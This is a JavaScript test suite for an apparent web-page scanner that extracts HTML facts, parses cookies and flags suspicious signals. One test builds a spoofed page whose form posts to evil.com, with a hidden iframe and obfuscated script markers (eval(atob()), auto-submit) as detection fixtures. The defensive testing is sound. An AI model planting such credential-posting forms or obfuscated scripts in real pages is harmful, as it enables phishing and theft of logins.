import test from 'node:test';
import assert from 'node:assert/strict';
import { performance } from 'node:perf_hooks';
import { extractHtmlFacts, decodeHtml } from '../lib/html-facts.js';
import { parseSetCookies } from '../lib/cookies.js';
import { validateHtmlFacts, LIMITS } from '../lib/contract.js';
const fixture={url:'https://example.com/page'};
const parse=html=>{const facts=extractHtmlFacts(html,fixture.url);assert.deepEqual(validateHtmlFacts(facts).errors,[]);return facts;};
test('HTML clean, metadata, relative assets and forms',()=>{
  const f=parse('<html lang=ja><title>A &amp; B</title><h1>見出し</h1><meta property="og:site_name" content=店><meta name=generator content=CMS><meta name=referrer content=no-referrer><meta name=robots content="noindex,follow"><meta http-equiv=Content-Security-Policy content="default-src self"><form action=/login method=post><input type=password><input type=email><input type=file><input type=hidden><input autocomplete=cc-number></form><script src=/app.js async defer type=module integrity=hash></script><style>secret</style><link rel=stylesheet href="//cdn.com/style.css"><img src="http://cdn.com/a"><a href="https://other.com/">external</a>');
  assert.equal(f.title,'A & B');assert.equal(f.h1,'見出し');assert.equal(f.siteName,'店');assert.equal(f.forms[0].actionHost,null);
  for(const key of ['hasPassword','hasEmail','hasFileUpload','hasCardLike'])assert.equal(f.forms[0][key],true);
  assert.equal(f.forms[0].hidden,1);assert.equal(f.scripts.external[0].module,true);assert.equal(f.styles.inline,1);
  assert.equal(f.images.http,1);assert.deepEqual(f.links.externalHosts,['other.com']);assert.equal(f.signals.metaCsp,true);assert.equal(f.signals.noindex,true);
  assert.ok(!f.textSample.includes('secret'));
});
test('HTML spoof and obfuscation facts',()=>{
  const f=parse('<base href="https://other.com/"><title>Index of /</title><meta http-equiv=refresh content="0; url=https://next.com/"><form action="//evil.com/"><input id=card-number type=password></form><iframe src="http://evil.com/" style="display: none" sandbox></iframe><script>eval(atob("xx"));unescape("xx");document.write();'+ '\\x61'.repeat(20)+';'+ 'String.fromCharCode(65);'.repeat(5)+';'+ 'a'.repeat(2100)+'; onload=x; form.submit()</script>');
  assert.equal(f.baseHref,'https://other.com/');assert.equal(f.forms[0].actionHost,'evil.com');assert.equal(f.forms[0].hasCardLike,true);
  assert.equal(f.iframes[0].hidden,true);assert.equal(f.signals.directoryListing,true);assert.equal(f.signals.autoSubmit,true);assert.equal(f.signals.obfuscation.length,5);assert.equal(f.metaRefresh.delay,0);
});
test('HTML server defaults and error families',()=>{
  for(const [text,kind]of [['Welcome to nginx!','nginx'],['Apache2 Debian Default Page','apache'],['IIS Windows Server','iis'],['LiteSpeed','litespeed']])assert.equal(parse(text).signals.defaultPage,kind);
  for(const [text,kind]of [['Fatal error:','php'],['Warning: bad on line 9','php'],['Traceback (most recent call last)','python'],['java.lang.Error','java'],["Server Error in '/' Application",'dotnet'],['SQLSTATE[HY00]','sql'],['ORA-12345','sql'],['ReferenceError: x at Object.<anonymous>','node'],['Stack trace:','generic']])assert.equal(parse(text).signals.errorDisclosure,kind);
});
test('HTML limits and unclosed hostile markup',()=>{
  const f=parse(('<form><input type=password></form><script src=x></script><link rel=stylesheet href=x><iframe src=x></iframe><a href="https://other.com">a</a>').repeat(100));
  assert.equal(f.forms.length,10);assert.equal(f.scripts.external.length,40);assert.equal(f.styles.external.length,20);assert.equal(f.iframes.length,10);
  assert.equal(parse('<script>not visible').textSample,'');assert.equal(parse('<!-- not closed').textSample,'');
  assert.equal(parse('<p>'.repeat(7000)).truncated,true);
});
for(const [kind,html]of [
  ['angle','<'.repeat(LIMITS.BODY_CAP_BYTES)],
  ['attribute','<div x="'+ 'a'.repeat(LIMITS.BODY_CAP_BYTES-9)+'"'],
  ['script',('<script>'+('a'.repeat(1999)+' ').repeat(Math.ceil(LIMITS.BODY_CAP_BYTES/2000))).slice(0,LIMITS.BODY_CAP_BYTES)]
])test('HTML exact byte cap linear median '+kind,()=>{
  assert.equal(new TextEncoder().encode(html).length,LIMITS.BODY_CAP_BYTES);
  const times=[];
  for(let i=0;i<15;i++){const start=performance.now();extractHtmlFacts(html,fixture.url);times.push(performance.now()-start);}
  const median=[...times].sort((a,b)=>a-b)[7];
  assert.ok(median<10,kind+': '+median+'ms');
  parse(html);
  process.stdout.write('# HTML '+kind+' first='+times[0].toFixed(3)+'ms median='+median.toFixed(3)+'ms\n');
});
test('HTML decoder honors Shift_JIS/EUC-JP and fallback',()=>{
  assert.equal(decodeHtml(new Uint8Array([0x82,0xa0]),'text/html; charset=Shift_JIS'),'あ');
  assert.equal(decodeHtml(new Uint8Array([0xa4,0xa2]),'text/html; charset=EUC-JP'),'あ');
  const prefix=new TextEncoder().encode('<meta charset=Shift_JIS>');
  assert.ok(decodeHtml(new Uint8Array([...prefix,0x82,0xa0])).endsWith('あ'));
  assert.equal(decodeHtml(new TextEncoder().encode('日本語'),'text/html; charset=unknown'),'日本語');
});
test('Cookie values discarded; prefix, persistence, bounds',()=>{
  const c=parseSetCookies(['__Host-session=SECRET; Secure; HttpOnly; SameSite=Lax; Path=/','__Secure-id=secret; Domain=example.com; Max-Age=60; SameSite=None','x=secret; Expires=Wed, 21 Oct 2026 00:00:00 GMT','bad', 'x'.repeat(100)+'=secret',...Array(30).fill('a=secret')]);
  assert.equal(c.length,20);assert.equal(c[0].prefix,'__Host-');assert.equal(c[0].secure,true);assert.equal(c[0].httpOnly,true);assert.equal(c[1].persistent,true);assert.equal(c[2].persistent,true);assert.equal(c[3].name.length,64);assert.ok(!JSON.stringify(c).includes('secret'));assert.ok(!JSON.stringify(c).includes('SECRET'));
});
test('HTML cap excludes later facts and avoids retaining long visible text',()=>{
  const f=parse('<title>first</title>'+' '.repeat(LIMITS.BODY_CAP_BYTES)+'<h1>outside</h1>Fatal error:');
  assert.equal(f.truncated,true);assert.equal(f.h1,null);assert.equal(f.signals.errorDisclosure,null);
  assert.ok(f.textSample.length<=400);
});
test('HTML attribute character scan preserves entities, Unicode whitespace and duplicates',()=>{
  const f=parse('<html\u00a0lang\u2003=\u3000"ja"><title>A &#x26; &#38; &#0; &unknown;</title><script src = "a&amp;b.js" src=ignored></script><form action=\'/a>b\'><input TYPE=\'password\' disabled /></form>');
  assert.equal(f.lang,'ja');assert.equal(f.title,'A & & &#0; &unknown;');assert.equal(f.scripts.external[0].src,'a&b.js');
  assert.equal(f.forms[0].action,'/a>b');assert.equal(f.passwordFields,1);
});
